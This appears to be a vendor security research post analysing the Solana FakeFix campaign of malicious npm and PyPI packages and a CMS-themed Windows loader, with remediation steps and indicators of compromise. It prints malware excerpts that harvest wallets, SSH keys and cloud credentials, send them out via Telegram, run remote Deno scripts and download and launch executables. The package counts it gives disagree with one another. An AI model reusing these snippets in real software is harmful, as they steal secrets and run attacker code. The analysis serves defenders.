---
excerpt: "JFrog Security Research identified Solana FakeFix, a campaign of 24 malicious npm and PyPI packages that lured Solana developers with fake stable-build fixes while stealing wallets, developer tokens, and CI secrets."
title: "Solana FakeFix: 25 Malicious npm and PyPI Packages Lure Developers With Fake Stable Builds"
date: "June 9, 2026"
description: "Guy Korolevski and Andrii Polkovnychenko, JFrog Security Researchers"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/solana-fakefix/image1.jpg
type: realTimePost
minutes: '12'
---

JFrog Security Research recently identified **Solana FakeFix**, a campaign of 20 malicious npm and PyPI packages that target Solana developers.. The packages used fake stable-build fixes, typosquatting, fake Solana SDK branding, working-looking library code, and lifecycle execution to steal wallet keys, cloud credentials, source-control tokens, SSH keys, and environment secrets.

Another campaign covered in this article is the **CMS windows loader**, which contains 5 npm packages, loading remote executables and Javascript code to run dynamically.

![](/img/RealTimePostImage/post/solana-fakefix/image1.jpg)

## Solana FakeFix Campaign Overview

The campaign includes 16 npm packages and 4 PyPI packages. Most of the npm packages imitate Solana developer tooling, including names such as `@solana-labs/web3.js`, `@solana-labs/spl-toke`, `solana-web3-stable`, and `solana-rpc-client`. The names are close enough to trusted Solana ecosystem terminology to attract developers searching for SDKs, patched builds, community forks, or MEV tooling.   

![](/img/RealTimePostImage/post/solana-fakefix/image2.jpg)

## The Lure: "Fixing" Solana Build Issues

The Solana-labs packages appear to have been promoted through GitHub issue spam by the user `PassWord1337`, likely by the same actor connected to the GitHub-hosted update URL seen elsewhere in the campaign. The actor opened nine issues across different projects, presenting `@solana-labs/web3.js` as a community-maintained drop-in replacement for `@solana/web3.js` v2.   

![](/img/RealTimePostImage/post/solana-fakefix/image3.png)

The issue text claimed that the package fixed build and type issues and suggested the following command:

```shell
npm uninstall @solana/web3.js && npm install @solana-labs/web3.js
```

The lure was designed to reach maintainers and developers already dealing with Solana dependency friction. Instead of advertising a random package, it framed the malicious package as a practical compatibility fix for projects trying to stabilize their builds. The issues were later edited down to a single `x`, which suggests an attempt to remove or obscure the original lure after publication.

The GitHub account of `PassWord1337` follows multiple hackers and cryptocurrency exploits development accounts, and the only non-malicious comment he made was during 2025 in one of the cryptocurrency repos.  

![](/img/RealTimePostImage/post/solana-fakefix/image4.png)

## Initial Delivery Through npm and PyPI Execution Hooks

The earliest npm variants used a direct lifecycle script. Once a developer installed the package, npm executed attacker-controlled JavaScript without requiring any import or runtime use of the library.

```json
{
  "scripts": {
    "postinstall": "node install.js"
  }
}
```

The payload immediately configured Telegram C2 and searched the local system for developer secrets. The first Solana-labs packages used bot token `8628389567:AAHeoLi034Vg6J…` and chat ID `8346336575`.

```javascript
const BOT = '8628389567:AAHeoLi034Vg6J...';
const CHAT = '8346336575';

const targets = [
  path.join(HOME, '.config', 'solana', 'id.json'),
  path.join(HOME, '.solana', 'id.json'),
  path.join(HOME, '.ssh', 'id_rsa'),
  path.join(HOME, '.ssh', 'id_ed25519'),
  path.join(HOME, '.aws', 'credentials'),
  path.join(CWD, '.env'),
  path.join(CWD, 'wallet.json')
];
```

The Python packages used a different trigger. Their payload was placed in `__init__.py`, meaning a simple `import` could start collection and persistence. The three PyPI packages shared the same compact payload and used the bot token `8870595195:AAHcwv2ZMYZU9ia_xj…`.

```py
BT='8870595195:AAHcwv2ZMYZU9ia_xj...'
CT='8346336575'

def _collect():
    tgts = [
        os.path.join(HD,'.config','solana','id.json'),
        os.path.join(HD,'.solana','id.json'),
        os.path.join(HD,'.ssh','id_rsa'),
        os.path.join(HD,'.ssh','id_ed25519'),
        os.path.join(HD,'.aws','credentials'),
        os.path.join(CW,'.env')
    ]
    ...
```

While npm lifecycle hooks execute during package installation, often inside developer machines and CI pipelines. PyPI import-time malware can remain dormant until the package is imported, which may happen later in tests, scripts, notebooks, or application startup.

## From Simple Backdoor to Trojanized Solana Libraries

The campaign evolved beyond short install scripts. Later npm packages shipped **functional-looking Solana JavaScript** bundles with malicious code appended after legitimate exports and source-map markers. This allows the package to appear useful during casual testing while still activating a hidden stealer path.

```javascript
const LAMPORTS_PER_SOL = 1000000000;
export { Account, AddressLookupTableAccount, ... };
//# sourceMappingURL=index.esm.js.map
;(function(){
  // around line 11227
  // stealer code was inserted here
})();
```

The appended payloads scanned for Solana keypairs, SSH keys, AWS credentials, `.env` files, wallet files, and sensitive environment variables containing names such as `KEY`, `SECRET`, `MNEMONIC`, `PRIVATE`, `TOKEN`, `PASSWORD`, `AWS`, `NPM`, `GITHUB`, `CI`, `DEPLOY`, `SOLANA`, `ALCHEMY`, `INFURA`, or `ETHERSCAN`.

Several variants also established persistence and polled Telegram for operator commands. The command surface included `/keys`, `/ssh`, `/env`, `/wallet`, `/sh`, `/cmd`, and `/die`, making the payload a general backdoor rather than a one-time stealer.

```javascript
if (txt === '/keys' || txt === '/grab') {
  ...
} else if (txt === '/ssh') {
  ...
} else if (txt === '/env') {
  ...
} else if (txt === '/wallet') {
  ...
} else if (txt.startsWith('/sh ') || txt.startsWith('/cmd ')) {
  ...
}
```

The more advanced Solana-labs packages also introduced sandbox checks, token validation, self-update behavior, and Solana-specific tampering. One version attempted to fetch a replacement installer from `hxxps[:]//raw[.]githubusercontent[.]com/PassWord1337/updates/main/install.js`, which was no longer available at the time of writing. The same variant attempted to drain Solana funds to wallet `D4hGgKKaBFZV1NUTWvYRwbpu8HHr3qmDfHyKCTLqbaE7` and changed Solana RPC settings to `hxxp[:]//104[.]239[.]66[.]223:8899`.

## Fake MEV Bot Private-Key Phishing

The `solana-mev-bot` package used a more direct social-engineering path. Instead of pretending to be a patched SDK, it presented itself as a profit-generating MEV **(Maximal Extractable Value)** or sandwich bot and asked the user to paste a Solana private key.

In the crypto world, real MEV bots scan the blockchain for pending transactions and "sandwich" them (buying right before a large transaction and selling right after) to pocket a small profit. Because people know real MEV bots can be highly profitable, scammers use this as a hook. They promise you "free passive income" or "automated profits" if you just run their software or use their platform.

```javascript
const BOT_TOKEN = '8870595195:AAHcwv2ZMYZ...';
const CHAT_ID = '8346336575';
const DRAIN = 'D4hGgKKaBFZV1NUTWvYRwbpu8HHr3qmDfHyKCTLqbaE7';

rl.question('Enter your Solana private key (base58 or JSON array) to start earning:\n> ', (key) => {
  ...
  stealEverything(keyBytes);
});
```

The package also searched for `.env`, Solana keypair files, SSH keys, AWS credentials, and key-like environment variables. This variant shows the campaign mixing technical package abuse with a classic crypto scam: asking the victim to provide the one secret needed to steal funds.

## CMS Windows Loader Campaign Overview

The CMS-themed npm packages were uploaded by the user `thermonuclear`, it includes   
packages such as `cms-storehub`, `cms-helpgit`, `cms-github`, `to-cms`, and `shopifyto-cms`. These packages are not Solana SDK implants, but they use the same npm install-time execution model and load hidden Windows payloads or EXE droppers. One `cms-storehub` version also sent installation telemetry to Telegram.  

![](/img/RealTimePostImage/post/solana-fakefix/image5.jpg)

## CMS-Themed Windows Loaders

The CMS-themed packages used a different payload family. `cms-storehub`, `cms-helpgit`, and `cms-github` wrote and launched hidden PowerShell scripts from npm lifecycle hooks. These scripts attempted to install or locate Deno, then ran remote JavaScript from `77.90.185.225` with broad permissions. **Deno** is a modern runtime environment used to execute JavaScript and TypeScript code outside of a web browser.

```javascript
const psScript = `
try { Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force } catch {}
...
if (-not (Get-Command deno -ErrorAction SilentlyContinue)) {
  winget install --id DenoLand.Deno -e --accept-source-agreements --accept-package-agreements --silent 2>$null
}
...
& $deno run -A "hxxp[:]//77[.]90[.]185[.]225/v026a4a141fd9e7d2dd.js"
`;
```

Follow-up analysis of the Deno loader showed that `v026a4a141fd9e7d2dd.js` acts as a launcher. It repeatedly fetches and evaluates a second script from `hxxp[:]//77[.]90[.]185[.]225/v26a4a141fd9e7d2dd.js`, retrying every five seconds on failure and re-running the fetched code every 30 seconds.

```javascript
var servers = "hxxp[:]//77[.]90[.]185[.]225".split(",");

for (;;) {
  let response = await fetch(servers[i % servers.length] + "/v26a4a141fd9e7d2dd.js");
  let body = await response.text();
  await (0, eval)("(async()=>{" + body + "})()");
  await new Promise(resolve => setTimeout(resolve, 30000));
}
```

The obfuscated second stage is a Windows-oriented loader:  
![](/img/RealTimePostImage/post/solana-fakefix/image6.jpg)

It creates a local mutex by binding `127.0.0.1:10092`, derives a host identifier from the username, hostname, memory size, and OS release, then writes `v026a4a141fd9e7d2dd.js` into `%APPDATA%` or the temp directory under a hash-based filename. It persists through the current user's Registry Run key and launches Deno through `conhost.exe --headless`.

```javascript
l(10092) || (a("[l2] mutex held, exiting"), Deno.exit(0));

let path = appData + "\\" + hash(username) + ".js";
let payload = "conhost.exe --headless \"" + Deno.execPath() + "\" -A \"" + path + "\"";
let command = "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' " +
  "-Name '" + hash(username) + "' -Value '" + payload.replaceAll("'", "''") + "' -Force";
```

After persistence, the second stage checks `hxxp[:]//77[.]90[.]185[.]225/health`, registers with `hxxp[:]//77[.]90[.]185[.]225/message`, and sends headers including `x-module-request: main`, `x-prepare-main-v2: 1`, `x-huid`, `x-username`, and `x-hostname`. Initial communication to the server is based on a hardcoded JWT as a Bearer token when talking to the C2. 

The server response is expected to contain an `id`; the loader then downloads `hxxp[:]//77[.]90[.]185[.]225/v2{id}.js` and executes it by spawning `deno run -A --no-check -` with the downloaded bytes passed through stdin. This design lets the operator rotate the final payload while keeping the package-side loader stable.

```javascript
let { id } = await (await fetch(base + "/message", { headers })).json();
let main = await fetch(base + "/v2" + id + ".js");

let child = new Deno.Command(Deno.execPath(), {
  args: ["run", "-A", "--no-check", "-"],
  stdin: "piped",
  stdout: "inherit",
  stderr: "inherit"
}).spawn();
```

Other CMS packages, including `to-cms` and `shopifyto-cms`, behaved as simple download-and-execute droppers. They exposed a misleading `chrome-installer` binary name, downloaded a Windows executable into the temporary directory, executed it, and attempted cleanup shortly afterward. The Replit-hosted payload URL shown below was no longer available during follow-up analysis, preventing additional analysis of that remote executable from the URL alone.

```javascript
const DOWNLOAD_URL = 'hxxps[:]//whiteshopify[.]replit[.]app/api/aCpsuydgwbasd.exe';
const EXE_NAME = 'aCpsuydgwbasd.exe';
const FILE_PATH = path.join(os.tmpdir(), EXE_NAME);

https.get(DOWNLOAD_URL, (response) => {
  const file = fs.createWriteStream(FILE_PATH);
  response.pipe(file);
  ...
  exec(`start "" "${FILE_PATH}"`);
});
```

Hidden PowerShell execution, remote code execution with `deno run -A`, Registry persistence, dynamic second-stage retrieval, EXE download and launch, and post-execution cleanup are not legitimate install behavior for CMS helper packages.  
![](/img/RealTimePostImage/post/solana-fakefix/image7.jpg)

## Remediation

- Remove all affected packages from developer machines, CI images, build workers, and internal package caches. For npm, run `npm uninstall <package-name>` and review `package-lock.json`, `yarn.lock`, or `pnpm-lock.yaml`. For PyPI, run `pip uninstall <package-name>` and review `requirements.txt`, `poetry.lock`, or other dependency lock files.  
- Rotate all Solana wallets and keypairs that may have been present on affected systems, especially `~/.config/solana/id.json`, `~/.solana/id.json`, `%APPDATA%\Solana\id.json`, `keypair.json`, and `wallet.json`. Move remaining funds to newly generated wallets from a clean host.  
- Rotate SSH private keys, AWS access keys, GitHub tokens, npm tokens, CI tokens, Azure secrets, package registry tokens, AI/API keys, and any other secrets stored in environment variables or `.env` files on affected systems.  
- Audit for persistence artifacts, including npm lifecycle-created scripts, Windows scheduled tasks, Registry Run keys, startup VBS files, PowerShell profile hooks, Unix crontab `@reboot` entries, shell profile hooks, and macOS LaunchAgents.  
- Search logs and network telemetry for Telegram API traffic to `hxxps[:]//api[.]telegram[.]org/bot.../sendMessage` and `hxxps[:]//api[.]telegram[.]org/bot.../getUpdates`, RPC redirection to `hxxp[:]//104[.]239[.]66[.]223:8899`, Deno execution from `hxxp[:]//77[.]90[.]185[.]225`, and EXE downloads from `hxxps[:]//meet-fr[.]com` or `hxxps[:]//whiteshopify[.]replit[.]app`.  
- Rebuild affected CI runners, developer containers, and build agents from trusted images. Do not rely only on package removal when backdoor commands or persistence mechanisms may have been executed.  
- Review dependency provenance for Solana packages with near-miss names, patched/fixed/forked wording, or unexpected lifecycle hooks. Treat install-time network access and hidden PowerShell execution as high-risk package behavior.

## Conclusions

Solana FakeFix shows how quickly package malware can move from obvious typosquatting to more convincing Trojanized libraries and targeted maintainer lures. The campaign started with install-time JavaScript backdoors, then evolved into functional-looking Solana bundles, Python import-time stealers, private-key phishing, RPC tampering, and Windows loader behavior.

These packages targeted the exact places where developers and CI systems keep high-value secrets: Solana keypairs, `.env` files, SSH keys, cloud credentials, and source-control tokens. 

These packages are already detected by JFrog Xray and JFrog Curation, under the Xray IDs listed in the IoC section below.

## IOCs

### Affected Packages

| Package | Ecosystem | XRAY ID |
| :---- | :---- | :---- |
| `@solana-labs/ancor` | npm | XRAY-997667 |
| `@solana-labs/etherjs` | npm | XRAY-997672 |
| `@solana-labs/spl-toke` | npm | XRAY-997661 |
| `@solana-labs/web3-js` | npm | XRAY-997666 |
| `@solana-labs/web3.js` | npm | XRAY-997659 |
| `@solana-labs/web3js` | npm | XRAY-997665 |
| `cms-github` | npm | XRAY-993898 |
| `cms-helpgit` | npm | XRAY-993899 |
| `cms-storehub` | npm | XRAY-993703 |
| `shopifyto-cms` | npm | XRAY-993885 |
| `solana-js-client` | npm | XRAY-997805 |
| `solana-mev-bot` | npm | XRAY-998837 |
| `solana-rpc-client` | npm | XRAY-997811 |
| `solana-web3-community` | npm | XRAY-997807 |
| `solana-web3-fixed` | npm | XRAY-997809 |
| `solana-web3-fork` | npm | XRAY-997799 |
| `solana-web3-lts` | npm | XRAY-997810 |
| `solana-web3-patched` | npm | XRAY-997800 |
| `solana-web3-stable` | npm | XRAY-997812 |
| `solana-web3-v1` | npm | XRAY-997808 |
| `to-cms` | npm | XRAY-989687 |
| `solana-cli-py` | PyPI | XRAY-998590 |
| `solana-web3` | PyPI | XRAY-998591 |
| `solana-web3-py` | PyPI | XRAY-998594 |
| `spl-token-py` | PyPI | XRAY-998595 |

### Telegram IOCs

- Bot token: `8870595195:AAHcwv2ZMYZU9ia…`  
- Bot token: `8628389567:AAHeoLi034Vg6JI…`  
- Bot token: `8604278531:AAE_AAlOXE-5wWs…`  
- Chat ID: `8346336575`  
- Chat ID: `-1003931822407`

### Network and Wallet IOCs

- Solana drain wallet: `D4hGgKKaBFZV1NUTWvYRwbpu8HHr3qmDfHyKCTLqbaE7`  
- Malicious Solana RPC endpoint: `hxxp[:]//104[.]239[.]66[.]223:8899`  
- Remote Deno loader: `hxxp[:]//77[.]90[.]185[.]225/v026a4a141fd9e7d2dd.js`  
- Remote Deno second-stage loader: `hxxp[:]//77[.]90[.]185[.]225/v26a4a141fd9e7d2dd.js`  
- Remote Deno health endpoint: `hxxp[:]//77[.]90[.]185[.]225/health`  
- Remote Deno registration endpoint: `hxxp[:]//77[.]90[.]185[.]225/message`  
- Remote Deno dynamic payload pattern: `hxxp[:]//77[.]90[.]185[.]225/v2{id}.js`  
- Remote Deno loader: `hxxp[:]//77[.]90[.]185[.]225/v0277dff354c59f92d3.js`  
- Remote Deno loader: `hxxp[:]//77[.]90[.]185[.]225/ae83b0125aa433a7.js`  
- Remote Deno loader: `hxxp[:]//77[.]90[.]185[.]225/de2079d13aa5d620.js`  
- Remote Deno loader: `hxxp[:]//77[.]90[.]185[.]225/6bc8fb9ad965fbb0.js`  
- Self-update URL, no longer available at the time of writing: `hxxps[:]//raw[.]githubusercontent[.]com/PassWord1337/updates/main/install.js`  
- EXE download URL: `hxxps[:]//meet-fr[.]com/ChromeSetup.exe`  
- EXE download URL, no longer available during follow-up analysis: `hxxps[:]//whiteshopify[.]replit[.]app/api/aCpsuydgwbasd.exe`

### Targeted Paths and Persistence Indicators

- `~/.config/solana/id.json`  
- `~/.solana/id.json`  
- `%APPDATA%\Solana\id.json`  
- `~/.ssh/id_rsa`  
- `~/.ssh/id_ed25519`  
- `~/.aws/credentials`  
- `.env`  
- `.env.local`  
- `.env.production`  
- `/app/.env`  
- `/root/.env`  
- `/home/node/.env`  
- `keypair.json`  
- `wallet.json`  
- `secrets.json`  
- Windows scheduled task persistence  
- Windows Registry Run key persistence  
- Windows Registry Run key value launching `conhost.exe --headless <deno> -A <hash>.js`  
- Local mutex listener on `127.0.0.1:10092`  
- Windows startup VBS persistence  
- PowerShell profile hook persistence  
- Unix crontab `@reboot` persistence  
- Shell profile hook persistence  
- macOS LaunchAgent persistence  
- Deno `run -A` remote script execution
